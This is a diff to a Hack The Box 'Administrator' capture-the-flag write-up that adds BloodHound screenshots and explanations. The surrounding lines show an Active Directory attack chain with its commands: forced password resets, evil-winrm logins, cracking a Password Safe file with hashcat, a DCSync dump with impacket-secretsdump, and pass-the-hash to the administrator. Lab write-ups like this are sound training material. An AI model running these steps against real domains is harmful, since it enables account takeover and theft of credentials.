@@ -147,7 +147,7 @@ Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credent
 Since `michael` also has the `PSRemote` privilege, we can log in using `evil-winrm` again. 
 
 ```bash
-evil-winrm -i 10.10.11.42 -u michael -p Password123!
+evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
 ```
 
 By looking at the `BloodHound` data, we see that `michael` has the `ForceChangePassword` privilege over the `benjamin` user. We can execute the same attack to change his password. 
@@ -162,7 +162,11 @@ $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
 ```
 
-Now, however, the `benjamin` user does not have the `PSRemote` privilege, but we can log into the FTP port found in the NMap scan. On it, we find an interesting password safe file that we can download. 
+Here is the path we took in BloodHound to get from the `olivia` user to the `benjamin` user: 
+
+![](/img/htb/administrator/bloodhound_olivia_to_benjamin.png)
+
+Now, however, the `benjamin` user does not have the `PSRemote` privilege, but we can log into the FTP port found in the NMap scan. On it, we find an interesting `Password Safe` file that we can download. `Password Safe` is a software that lets you create and secure a username/password list with a single master password. 
 
 ```bash
 ftp 10.10.11.42
@@ -190,7 +194,7 @@ File may not have transferred correctly.
 ftp> 
 ```
 
-This file can be passed to `hashcat` to recover the password safe combination (the master password). 
+This file can be passed to `hashcat` to recover the password safe combination (the master password). The mode 5200 is specifically for `Password Safe v3`. 
 
 ```batch
 .\hashcat.exe -m 5200 Backup.psafe3 rockyou.txt
@@ -236,6 +240,11 @@ Once we have `ethan`'s password, we can see in `BloodHound` that he has `DCSync`
 impacket-secretsdump ADMINISTRATOR/ethan:limpbizkit@administrator.htb
 ```
 
+Here is the path we took in BloodHound to get from the `emily` user to the `administrator` user: 
+
+![](/img/htb/administrator/bloodhound_emily_to_administrator.png)
+
+
 Finally, we can use `evil-winrm` again to pass the administrator hash and get our root flag. 
 
 ```bash
@@ -250,11 +259,12 @@ type ..\Desktop\root.txt
 
 ## Resources:
 
-| Hyperlink                                      | Info        |
-| ---------------------------------------------- | ----------- |
-| https://github.com/Hackplayers/evil-winrm      | Evil-WinRM  |
-| https://github.com/SpecterOps/BloodHound       | BloodHound  |
-| https://github.com/SpecterOps/SharpHound       | SharpHound  |
-| https://github.com/PowerShellMafia/PowerSploit | PowerSploit |
-| https://github.com/fortra/impacket             | Impacket    |
-| https://github.com/hashcat/hashcat             | hashcat     |
+| Hyperlink                                      | Info          |
+| ---------------------------------------------- | ------------- |
+| https://github.com/Hackplayers/evil-winrm      | Evil-WinRM    |
+| https://github.com/SpecterOps/BloodHound       | BloodHound    |
+| https://github.com/SpecterOps/SharpHound       | SharpHound    |
+| https://github.com/PowerShellMafia/PowerSploit | PowerSploit   |
+| https://github.com/fortra/impacket             | Impacket      |
+| https://github.com/hashcat/hashcat             | hashcat       |
+| https://www.pwsafe.org/                        | Password Safe |
